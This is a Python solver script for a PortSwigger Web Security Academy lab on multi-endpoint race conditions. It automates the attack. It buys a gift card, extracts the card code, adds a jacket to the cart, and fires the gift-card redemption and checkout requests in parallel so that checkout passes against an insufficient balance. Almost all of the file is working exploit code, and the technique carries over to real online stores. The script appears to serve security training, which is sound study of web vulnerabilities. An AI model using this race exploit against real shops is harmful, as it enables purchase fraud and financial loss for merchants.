# Lab 03 — Multi-endpoint race conditions
# PortSwigger: https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint
#
# Vulnerability: Gift card redemption and checkout both touch the same
#                store-credit balance via SEPARATE endpoints that aren't
#                synchronised against each other
# Aim:           Successfully purchase the "Lightweight l33t Leather
#                Jacket" despite insufficient standalone funds
#
# Technique:
#   Purchase a gift card first (to have something to redeem). Add the
#   jacket to the cart. Fire the gift-card redemption and the checkout
#   request in the SAME parallel burst — if checkout's balance check
#   races against the redemption's credit update, it may validate
#   against stale or double-counted balance.
#
# Usage: python race_conditions_lab03.py <url> [gift_card_product_id]

import sys
import re
import urllib3
from proxies import proxies
from race_conditions_utils import (banner, section, make_session, login,
                                    get_csrf_from_response, send_parallel,
                                    warm_connection, check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def find_product_id(session, url, name_fragment):
    r = session.get(url)
    idx = r.text.lower().find(name_fragment.lower())
    if idx != -1:
        window = r.text[max(0, idx - 300):idx + 50]
        m = re.search(r'productId=(\d+)', window)
        if m:
            return m.group(1)
    return None


if __name__ == "__main__":
    banner()
    section("LAB 03 — MULTI-ENDPOINT RACE CONDITIONS")

    if len(sys.argv) < 2:
        print("  Usage: python race_conditions_lab03.py <url> [gift_card_product_id]")
        sys.exit(1)

    url = sys.argv[1]
    gift_card_id = sys.argv[2] if len(sys.argv) > 2 else None

    session = make_session(proxies)
    if not login(session, url):
        sys.exit(1)

    # ── Step 1: buy a gift card first (something to redeem) ─────────────────
    print("\n  ── Step 1: locate and purchase a gift card\n")
    if not gift_card_id:
        gift_card_id = find_product_id(session, url, "gift card")
    if not gift_card_id:
        print("  ✘  Could not auto-detect the gift card product — supply")
        print(f"     it manually: python race_conditions_lab03.py {url} <id>")
        sys.exit(1)

    print(f"  ✔  Gift card product ID: {gift_card_id}")
    session.post(f"{url}/cart", data={"productId": gift_card_id, "redir": "PRODUCT", "quantity": "1"})
    r_gc_checkout = session.post(f"{url}/cart/checkout")
    print(f"  ℹ  Gift card checkout status: {r_gc_checkout.status_code}")

    # ── Step 2: extract the resulting gift card code ─────────────────────────
    code_match = re.search(r'([A-Z0-9]{10,})', r_gc_checkout.text)
    if not code_match:
        orders_page = session.get(f"{url}/my-account")
        code_match = re.search(r'([A-Z0-9]{10,})', orders_page.text)

    if not code_match:
        print("  ✘  Could not auto-extract the gift card code — inspect")
        print("     the checkout/orders response manually.")
        sys.exit(1)

    gift_code = code_match.group(1)
    print(f"  ✔  Gift card code: {gift_code}\n")

    # ── Step 3: add the jacket to the cart ───────────────────────────────────
    print("  ── Step 2: add the leather jacket to the cart\n")
    jacket_id = find_product_id(session, url, "l33t")
    session.post(f"{url}/cart", data={"productId": jacket_id, "redir": "PRODUCT", "quantity": "1"})

    # ── Step 4: warm the connection ────────────────────────────────────────
    warm_connection(session, url)

    # ── Step 5: race redemption against checkout ─────────────────────────────
    print("  ── Step 3: race gift-card redemption against checkout\n")
    account_page = session.get(f"{url}/my-account")
    csrf = get_csrf_from_response(account_page.text)

    def redeem_request():
        data = {"gift-card": gift_code}
        if csrf:
            data["csrf"] = csrf
        return session.post(f"{url}/my-account/apply-gift-card", data=data)

    def checkout_request():
        return session.post(f"{url}/cart/checkout")

    results = send_parallel([redeem_request, checkout_request])

    redeem_result, checkout_result = results
    check_status(redeem_result, [200, 302], "Gift card redemption")
    check_status(checkout_result, [200, 302], "Checkout (raced)")

    if checkout_result is not None and not isinstance(checkout_result, Exception):
        print_box("Checkout response (truncated)", checkout_result.text[:400])
        if "success" in checkout_result.text.lower() or checkout_result.status_code == 200:
            print("  ✔  Checkout may have succeeded — verify order history")
            print("     to confirm the jacket was actually purchased.")
    else:
        print("  ✘  Checkout request failed or timed out.")

    print()
    print("  ℹ  If this didn't land, the race window between these two")
    print("     endpoints may be narrow — try re-running (timing varies),")
    print("     or use Burp's single-packet attack for tighter synchronisation.")
